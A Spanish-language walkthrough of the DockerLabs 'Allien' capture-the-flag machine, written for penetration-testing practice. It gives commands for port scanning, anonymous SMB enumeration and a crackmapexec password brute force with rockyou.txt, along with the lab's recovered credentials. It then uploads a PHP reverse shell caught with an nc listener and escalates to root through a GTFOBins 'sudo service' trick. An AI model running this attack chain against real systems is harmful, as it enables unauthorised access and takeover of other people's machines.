### Allien-DockerLabs🇪🇸

#### 1. En primer lugar encenderemos el laboratorio.
```bash
 sudo bash ./auto_deploy.sh allien.tar
```

<img width="858" height="616" alt="image" src="https://github.com/user-attachments/assets/e0a6775c-e445-49a9-ab63-a2192499f788" />


#### 1.2 También haremos un ping para poder confirmar que la máquina esta encendida.

```bash
ping -c3 172.17.0.2
```

<img width="861" height="238" alt="image" src="https://github.com/user-attachments/assets/57e0ea50-5da4-47d9-a109-f5b07acb2762" />


#### 2. Ahora realizaremos un nmap para poder observar que puertos tenemos abiertos.
```bash
nmap -p- -sCV 172.17.0.2
```

<img width="865" height="582" alt="image" src="https://github.com/user-attachments/assets/ef525e95-53bf-465a-99ad-9fd94236a400" />


#### 3. Al ver los puertos abiertos por samba vamos a usar `smbclient` para listar los recursos compartidos (carpetas, impresoras o servicios) en un servidor SMB/Samba sin proporcionar una contraseña.

```bash
smbclient -L //172.17.0.2/ -N
```

<img width="856" height="247" alt="image" src="https://github.com/user-attachments/assets/a2ca9016-2ffb-4608-b7c7-ec5fbabb5c34" />


#### 3.2 Ahora vamos a entrar en myshare y vamos a extraer el fichero que hay dentro 

```bash
mbclient //172.17.0.2/myshare -N
ls
get access.txt
```

<img width="868" height="672" alt="image" src="https://github.com/user-attachments/assets/9bc0159a-c649-4873-9474-208ba9b50ec3" />


#### 4. Ahora vamos a descifrar el token en json.

<img width="1053" height="921" alt="image" src="https://github.com/user-attachments/assets/a21fc29c-abec-45a2-9e87-e18baf7756c0" />

```
{
  "email": "satriani7@eseemeb.dl",
  "role": "user",
  "iat": 1728160373,
  "exp": 1728163973,
  "jwk": {
    "kty": "RSA",
    "n": "63585299807980387262423612765866173553521316548264258884935554615225755006648660389688305989646519464133589253569380401152430881845853413695425815409772332541417497734428906778662277523133869957058017346064156925392027799732738825755501200786534741552322900016385201115526154902429620082614287042016709844522657707",
    "e": 65537
  }
}
```

#### 5. Con toda la información que tenemos vamos a enumerar el dominio SMB y empezar con la fuerza bruta para obtener los usuarios.

```bash
enum4linux -a 172.17.0.2
```

<img width="869" height="733" alt="image" src="https://github.com/user-attachments/assets/3d2ea534-b7bf-4b07-96eb-fdf0b596e123" />


#### 6. Ahora utilizaremos crackmap para poder encontrar la clave validad para este user.
```bash
crackmapexec smb 172.17.0.2 -u satriani7 -p /usr/share/wordlists/rockyou.txt
```

<img width="859" height="758" alt="image" src="https://github.com/user-attachments/assets/f05a8380-9544-4ec7-ba44-6930f1906e3b" />


#### 7. Ahora podemos acceder a las backups con el usuario y cuya contraseña.

```bash
smbclient //172.17.0.2/backup24 -U satriani7
# passwd: 50cent
```

<img width="865" height="116" alt="image" src="https://github.com/user-attachments/assets/63386770-5ffb-49cd-9bac-bae20ae1df76" />


#### 7.2 Ahora procedemos a buscar y encontraremos las credenciales.


<img width="876" height="718" alt="image" src="https://github.com/user-attachments/assets/91150618-8ef6-4225-a0d4-0d00707b8843" />


<img width="864" height="872" alt="image" src="https://github.com/user-attachments/assets/410a76ee-702e-45ba-a61f-9fcc9f0d375d" />



#### 8. Entraremos mediante SSH al saber el user y la password.

```bash
 ssh administrador@172.17.0.2
#passwd: Adm1nP4ss2024
```

<img width="856" height="540" alt="image" src="https://github.com/user-attachments/assets/9da8825a-5f23-4da6-a8fd-52f013d6b009" />


#### 9. AL estar dentro de la máquina ahora buscaremos escalar privilegios mediante los binarios que podemos modificar a root. Primero miraremos con `sudo -l` y si no deja con `find / -perm -4000 -type f 2>/dev/null`.


<img width="866" height="364" alt="image" src="https://github.com/user-attachments/assets/50d48f0a-3adc-4103-9330-a048593cae8c" />


#### 10. Primero vamos a crear la reverse shell de PentestMonkey (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).



#### 10.2 Para la reverse shell que debemos de hacer para entrar con www-data deberemos de descargar la reverse-shell .
```bash
smbclient //172.17.0.2/home -U administrador%Adm1nP4ss2024
put shell.php
```

<img width="874" height="309" alt="image" src="https://github.com/user-attachments/assets/33708aea-6565-4412-a6af-54c6110a93cb" />


#### 10.3 Por ultimo escuchamos y entramos con un curl.
```bash
nc -lvnp 4444
 curl http://172.17.0.2/shell.php
```

<img width="854" height="513" alt="image" src="https://github.com/user-attachments/assets/87294cf3-baa4-4ef9-ae01-d79c20571e8d" />


#### 11. Ahora vamos a proceder buscar escalar privilegios, primero miramos los binarios que podemos manipular.
```bash
sudo -l
```

<img width="867" height="211" alt="image" src="https://github.com/user-attachments/assets/ee94cddc-0184-44e9-84b8-633399a1494a" />

#### 11.2 Miramos ahora en nuestra sección de explotaciones y la ponemos a prueba. https://gtfobins.org/gtfobins/service/#sudo

```bash
sudo /usr/sbin/service ../../bin/bash
```

<img width="869" height="108" alt="image" src="https://github.com/user-attachments/assets/0719279e-66d7-4ebd-a204-6e779b64ef8d" />














